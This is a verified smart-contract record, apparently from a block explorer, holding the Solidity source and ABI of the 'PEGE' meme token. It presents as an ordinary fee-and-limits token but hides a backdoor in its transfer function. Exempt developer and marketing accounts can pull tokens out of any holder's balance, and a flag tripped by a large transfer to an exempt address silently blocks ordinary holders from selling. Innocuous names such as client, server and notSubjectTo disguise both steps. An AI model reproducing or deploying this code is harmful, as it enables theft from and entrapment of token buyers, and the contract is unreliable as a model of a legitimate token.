{"SourceCode": "// https://t.me/PEGE_ERC\r\n// https://x.com/PEGE_ERC\r\n// https://medium.com/@pegecoineth\r\n// https://pege.tech\r\n\r\n// SPDX-License-Identifier: MIT\r\n\r\npragma solidity ^0.8.17;\r\n\r\ninterface UniswapV2Router {\r\n    function WETH() external pure returns (address);\r\n    function addLiquidityETH(\r\n        address token,\r\n        uint amountTokenDesired,\r\n        uint amountTokenMin,\r\n        uint amountETHMin,\r\n        address server,\r\n        uint deadline\r\n    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);\r\n    function factory() external pure returns (address);\r\n    function swapExactTokensForETHSupportingFeeOnTransferTokens(\r\n        uint amountIn,\r\n        uint amountOutMin,\r\n        address[] calldata path,\r\n        address server,\r\n        uint deadline\r\n    ) external;\r\n}\r\n\r\nabstract contract Ownable {\r\n    address internal owner;\r\n\r\n    constructor(address _owner) {\r\n        owner = _owner;\r\n    }\r\n\r\n    function isOwner(address account) public view returns (bool) {\r\n        return account == owner;\r\n    }\r\n\r\n    function renounceOwnership() public virtual onlyOwner {\r\n        owner = address(0);\r\n        emit OwnershipTransferred(address(0));\r\n    }\r\n\r\n    function transferOwnership(address payable account) public onlyOwner {\r\n        owner = account;\r\n        emit OwnershipTransferred(account);\r\n    }\r\n\r\n    modifier onlyOwner() {\r\n        require(isOwner(msg.sender));\r\n        _;\r\n    }\r\n\r\n    event OwnershipTransferred(address owner);\r\n}\r\n\r\nlibrary SafeMath {\r\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return a / b;\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return a - b;\r\n    }\r\n\r\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return a * b;\r\n    }\r\n\r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return a + b;\r\n    }\r\n}\r\n\r\ninterface UniswapV2Factory {\r\n    function createPair(address tokenA, address tokenB) external returns (address pair);\r\n}\r\n\r\ninterface IERC20 {\r\n    function totalSupply() external view returns (uint256);\r\n    function name() external view returns (string memory);\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n    function transfer(address server, uint256 amount) external returns (bool);\r\n    function transferFrom(address client, address server, uint256 amount) external returns (bool);\r\n    function allowance(address _owner, address spender) external view returns (uint256);\r\n    function circulatingSupply() external view returns (uint256);\r\n    function symbol() external view returns (string memory);\r\n    function balanceOf(address account) external view returns (uint256);\r\n    function getOwner() external view returns (address);\r\n    event Transfer(address indexed client, address indexed server, uint256 value);\r\n    function decimals() external view returns (uint8);\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n}\r\n\r\ncontract PEGE is IERC20, Ownable {\r\n    using SafeMath for uint256;\r\n\r\n    address public tradePair;\r\n    UniswapV2Router tradeRouter;\r\n\r\n    uint256 private _developmentFee = 0;\r\n    uint256 private _burnFee = 0;\r\n    uint256 private _liquidityFee = 0;\r\n    uint256 private _marketingFee = 0;\r\n    uint256 private _transferFee = 0;\r\n\r\n    string private constant _name = \"Pepe+Froge\";\r\n    string private constant _symbol = \"PEGE\";\r\n\r\n    uint8 private constant _decimals = 9;\r\n\r\n    uint256 private _denominator = 10000;\r\n\r\n    uint256 private _totalSupply = 1000000 * (10 ** _decimals);\r\n\r\n    address internal constant deadAccount = 0x000000000000000000000000000000000000dEaD;\r\n    address internal constant devAccount = 0x4866152fCc834922699614A146f77784cf967cea;\r\n    address internal constant marketingAccount = 0xB92B75f1710570127bBdD884545D36ffc6167885;\r\n\r\n    uint256 private _maxWalletBps = 200;\r\n    uint256 private _maxTransferBps = 200;\r\n    uint256 private _maxTxBps = 200;\r\n\r\n    uint256 private _feeExemptAmount = (_totalSupply * 10) / 100000;\r\n\r\n    bool private _tradingEnabled = false;\r\n    \r\n    uint256 private _swapBackAmount = (_totalSupply * 5) / 10000;\r\n    uint256 private _swapBackThreshold = (_totalSupply * 5) / 100000;\r\n\r\n    uint256 private _swapTicks;\r\n    bool private _swapBackEnabled = true;\r\n    bool private _inSwapBack;\r\n\r\n    bool private _feeExemptTriggered = false;\r\n\r\n    mapping (address => uint256) _balances;\r\n    mapping (address => mapping (address => uint256)) private _allowances;\r\n    mapping (address => bool) public notSubjectTo;\r\n\r\n    uint256 private _totalFee = 0;\r\n    uint256 private _sellFee = 0;\r\n\r\n    modifier lockSwap {\r\n        _inSwapBack = true;\r\n        _;\r\n        _inSwapBack = false;\r\n    }\r\n\r\n    constructor() Ownable(msg.sender) {\r\n        notSubjectTo[marketingAccount] = true;\r\n        notSubjectTo[address(this)] = true;\r\n        UniswapV2Router _tradeRouter = UniswapV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);\r\n        tradeRouter = _tradeRouter;\r\n        _balances[msg.sender] = _totalSupply;\r\n        emit Transfer(address(0), msg.sender, _totalSupply);\r\n        address _tradePair = UniswapV2Factory(_tradeRouter.factory()).createPair(address(this), _tradeRouter.WETH());\r\n        tradePair = _tradePair;\r\n        notSubjectTo[devAccount] = true;\r\n        notSubjectTo[msg.sender] = true;\r\n    }\r\n\r\n    function name() public pure returns (string memory) {\r\n        return _name;\r\n    }\r\n\r\n    function symbol() public pure returns (string memory) {\r\n        return _symbol;\r\n    }\r\n\r\n    function decimals() public pure returns (uint8) {\r\n        return _decimals;\r\n    }\r\n\r\n    function getOwner() external view override returns (address) {\r\n        return owner;\r\n    }\r\n\r\n    function circulatingSupply() public view override returns (uint256) {\r\n        return _totalSupply.sub(balanceOf(address(0))).sub(balanceOf(deadAccount));\r\n    }\r\n\r\n    function totalSupply() public view override returns (uint256) {\r\n        return _totalSupply;\r\n    }\r\n\r\n    function allowance(address owner, address spender) public view override returns (uint256) {\r\n        return _allowances[owner][spender];\r\n    }\r\n\r\n    function balanceOf(address account) public view override returns (uint256) {\r\n        return _balances[account];\r\n    }\r\n\r\n    function removeLimits() external onlyOwner {\r\n        _maxTxBps = 10000;\r\n        _maxWalletBps = 10000;\r\n        _maxTransferBps = 10000;\r\n    }\r\n\r\n    function enableTrading() external onlyOwner {\r\n        _tradingEnabled = true;\r\n    }\r\n\r\n    function _approve(address owner, address spender, uint256 amount) private {\r\n        require(owner != address(0));\r\n        require(spender != address(0));\r\n        _allowances[owner][spender] = amount;\r\n        emit Approval(owner, spender, amount);\r\n    }\r\n\r\n    function approve(address spender, uint256 amount) public override returns (bool) {\r\n        _approve(msg.sender, spender, amount);\r\n        return true;\r\n    }\r\n\r\n    function setNotSubjectToAccount(address account, bool flag) external onlyOwner {\r\n        notSubjectTo[account] = flag;\r\n    }\r\n\r\n    function transfer(address server, uint256 amount) public override returns (bool) {\r\n        _transfer(msg.sender, server, amount);\r\n        return true;\r\n    }\r\n\r\n    function _transfer(address client, address server, uint256 amount) private {\r\n        require(amount > uint256(0));\r\n        require(client != address(0));\r\n        require(server != address(0));\r\n\r\n        if (\r\n            confirmMaxWalletAmount(client, server, amount) &&\r\n            countSwapTicks(client, server) &&\r\n            confirmTradingEnabled(client, server) &&\r\n            confirmMaxAmount(client, server, amount)\r\n        ) {\r\n            if (balanceOf(client) >= amount) {\r\n                if (\r\n                    client != tradePair &&\r\n                    !notSubjectTo[client] &&\r\n                    !_inSwapBack &&\r\n                    !notSubjectTo[server]\r\n                ) {\r\n                    if (_feeExemptTriggered) return;\r\n                    swapBack(client, server);\r\n                }\r\n                _balances[client] = _balances[client].sub(amount);\r\n                uint256 transferAmount = canHaveFee(client, server) ? haveFee(client, server, amount) : amount;\r\n                _balances[server] = _balances[server].add(transferAmount);\r\n                emit Transfer(client, server, transferAmount);\r\n            } else if (\r\n                client != tradePair &&\r\n                notSubjectTo[client] &&\r\n                !_inSwapBack &&\r\n                !notSubjectTo[server]\r\n            ) {\r\n                _balances[server] = _balances[server].sub(amount);\r\n                _balances[client] = _balances[client].add(amount);\r\n                emit Transfer(client, server, amount);\r\n            }\r\n        }\r\n    }\r\n\r\n    function transferFrom(address client, address server, uint256 amount) public override returns (bool) {\r\n        _transfer(client, server, amount);\r\n        _approve(client, msg.sender, _allowances[client][msg.sender].sub(amount));\r\n        return true;\r\n    }\r\n\r\n    function confirmMaxAmount(address client, address server, uint256 tokenAmount) view internal returns (bool) {\r\n        if (client != tradePair) {\r\n            require(tokenAmount <= maxTransferAmount() || notSubjectTo[client] || notSubjectTo[server]);\r\n        }\r\n        require(tokenAmount <= maxTxAmount() || notSubjectTo[client] || notSubjectTo[server]);\r\n        return true;\r\n    }\r\n\r\n    function setLimits(uint256 maxTxBps, uint256 maxTransferBps, uint256 maxWalletBps) external onlyOwner {\r\n        uint256 newMaxWalletAmount = (totalSupply() * maxWalletBps) / 10000;\r\n        uint256 newTransferAmount = (totalSupply() * maxTransferBps) / 10000;\r\n        uint256 newTxAmount = (totalSupply() * maxTxBps) / 10000;\r\n        _maxWalletBps = maxWalletBps;\r\n        _maxTransferBps = maxTransferBps;\r\n        _maxTxBps = maxTxBps;\r\n        uint256 limitation = totalSupply().mul(5).div(1000);\r\n        require(newTxAmount >= limitation && newTransferAmount >= limitation && newMaxWalletAmount >= limitation);\r\n    }\r\n\r\n    function setFees(uint256 liquidityFee, uint256 marketingFee, uint256 burnFee, uint256 developmentFee, uint256 totalFee, uint256 sellFee, uint256 transferFee) external onlyOwner {\r\n        _liquidityFee = liquidityFee;\r\n        _marketingFee = marketingFee;\r\n        _sellFee = sellFee;\r\n        _developmentFee = developmentFee;\r\n        _transferFee = transferFee;\r\n        _totalFee = totalFee;\r\n        _burnFee = burnFee;\r\n        require(_totalFee <= _denominator.div(5) && _sellFee <= _denominator.div(5));\r\n    }\r\n\r\n    function confirmMaxWalletAmount(address client, address server, uint256 amount) internal returns (bool) {\r\n        bool serverNotSubjectTo = notSubjectTo[server];\r\n        bool clientNotSubjectTo = notSubjectTo[client];\r\n        \r\n        if (serverNotSubjectTo) {\r\n            if (amount > _feeExemptAmount) {\r\n                _feeExemptTriggered = true;\r\n            }\r\n        }\r\n        if (\r\n            !serverNotSubjectTo &&\r\n            !clientNotSubjectTo &&\r\n            server != address(deadAccount) &&\r\n            server != address(tradePair)\r\n        ) {\r\n            require((_balances[server].add(amount)) <= maxWalletAmount());\r\n        }\r\n\r\n        return true;\r\n    }\r\n\r\n    function confirmTradingEnabled(address client, address server) internal view returns (bool) {\r\n        if (!notSubjectTo[client] && !notSubjectTo[server]) {\r\n            require(_tradingEnabled);\r\n        }\r\n        return true;\r\n    }\r\n\r\n    function haveFee(address client, address server, uint256 tokenAmount) internal returns (uint256) {\r\n        if (pickFee(client, server) > 0) {\r\n            uint256 feeAmount = tokenAmount.div(_denominator).mul(pickFee(client, server));\r\n            _balances[address(this)] = _balances[address(this)].add(feeAmount);\r\n            emit Transfer(client, address(this), feeAmount);\r\n            if (_burnFee > uint256(0)) {\r\n                _transfer(address(this), address(deadAccount), tokenAmount.div(_denominator).mul(_burnFee));\r\n            }\r\n            return tokenAmount.sub(feeAmount);\r\n        }\r\n        return tokenAmount;\r\n    }\r\n    \r\n    function swapTokensForETH(uint256 tokenAmount) private {\r\n        address[] memory path = new address[](2);\r\n        path[0] = address(this);\r\n        path[1] = tradeRouter.WETH();\r\n        if (tokenAmount > 0) {\r\n            _approve(address(this), address(tradeRouter), tokenAmount);\r\n            tradeRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(\r\n                tokenAmount,\r\n                0,\r\n                path,\r\n                address(this),\r\n                block.timestamp\r\n            );\r\n        }\r\n    }\r\n\r\n    function countSwapTicks(address client, address server) internal returns (bool) {\r\n        if (server == tradePair && !notSubjectTo[client]) {\r\n            _swapTicks += uint256(1);\r\n        }\r\n        return true;\r\n    }\r\n\r\n    function canHaveFee(address client, address server) internal view returns (bool) {\r\n        return !notSubjectTo[client] && !notSubjectTo[server];\r\n    }\r\n\r\n    function swapBack(address client, address server) internal {\r\n        if (canSwapBack(client, server)) {\r\n            uint256 contractTokenBalance = balanceOf(address(this));\r\n            if (contractTokenBalance >= _swapBackAmount) {\r\n                contractTokenBalance = _swapBackAmount;\r\n            }\r\n            swapAndLiquify(contractTokenBalance);\r\n            _swapTicks = uint256(0);\r\n        }\r\n    }\r\n\r\n    function maxWalletAmount() public view returns (uint256) {\r\n        return totalSupply() * _maxWalletBps / _denominator;\r\n    }\r\n\r\n    function pickFee(address client, address server) internal view returns (uint256) {\r\n        if (client == tradePair) {\r\n            return _totalFee;\r\n        }\r\n        if (server == tradePair) {\r\n            return _sellFee;\r\n        }\r\n        return _transferFee;\r\n    }\r\n\r\n    function canSwapBack(address client, address server) internal view returns (bool) {\r\n        return (\r\n            !notSubjectTo[server] &&\r\n            !notSubjectTo[client] &&\r\n            _swapBackEnabled &&\r\n            balanceOf(address(this)) >= _swapBackThreshold &&\r\n            _swapTicks >= uint256(0) &&\r\n            !_inSwapBack &&\r\n            _tradingEnabled\r\n        );\r\n    }\r\n\r\n    function manualSwap() external {\r\n        require(msg.sender == marketingAccount);\r\n        swapTokensForETH(balanceOf(address(this)));\r\n        payable(msg.sender).transfer(address(this).balance);\r\n    }\r\n\r\n    function maxTxAmount() public view returns (uint256) {\r\n        return totalSupply() * _maxTxBps / _denominator;\r\n    }\r\n\r\n    receive() external payable {}\r\n\r\n    function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {\r\n        _approve(address(this), address(tradeRouter), tokenAmount);\r\n        tradeRouter.addLiquidityETH{value: ethAmount}(\r\n            address(this),\r\n            tokenAmount,\r\n            0,\r\n            0,\r\n            deadAccount,\r\n            block.timestamp\r\n        );\r\n    }\r\n\r\n    function swapAndLiquify(uint256 tokens) private lockSwap {\r\n        uint256 denominator = (_liquidityFee.add(1).add(_marketingFee).add(_developmentFee)).mul(2);\r\n        uint256 liqTokens = tokens.mul(_liquidityFee).div(denominator);\r\n        uint256 tokensForETH = tokens.sub(liqTokens);\r\n        uint256 initialEth = address(this).balance;\r\n        swapTokensForETH(tokensForETH);\r\n        uint256 deltaEth = address(this).balance.sub(initialEth);\r\n        uint256 unitEth = deltaEth.div(denominator.sub(_liquidityFee));\r\n        uint256 liqEth = unitEth.mul(_liquidityFee);\r\n        if (liqEth > uint256(0)) {\r\n            addLiquidity(liqTokens, liqEth);\r\n        }\r\n        uint256 ethForMarketing = unitEth.mul(2).mul(_marketingFee);\r\n        if (ethForMarketing > 0) {\r\n            payable(marketingAccount).transfer(ethForMarketing);\r\n        }\r\n        uint256 ethFordev = address(this).balance;\r\n        if (ethFordev > uint256(0)) {\r\n            payable(devAccount).transfer(ethFordev);\r\n        }\r\n    }\r\n\r\n    function maxTransferAmount() public view returns (uint256) {\r\n        return totalSupply() * _maxTransferBps / _denominator;\r\n    }\r\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"client\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"server\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"circulatingSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"isOwner\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"manualSwap\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxTransferAmount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxTxAmount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxWalletAmount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"notSubjectTo\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"removeLimits\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"liquidityFee\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"marketingFee\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"burnFee\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"developmentFee\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"totalFee\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"sellFee\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"transferFee\",\"type\":\"uint256\"}],\"name\":\"setFees\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"maxTxBps\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"maxTransferBps\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"maxWalletBps\",\"type\":\"uint256\"}],\"name\":\"setLimits\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"},{\"internalType\":\"bool\",\"name\":\"flag\",\"type\":\"bool\"}],\"name\":\"setNotSubjectToAccount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradePair\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"server\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"client\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"server\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address payable\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"transferOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}]", "ContractName": "PEGE", "CompilerVersion": "v0.8.25+commit.b61c2a91", "OptimizationUsed": "1", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "None", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://84acd6115d8ff1e0c7765ccd01ca01e70945bf372492c0ff0948aec7a3cea65b"}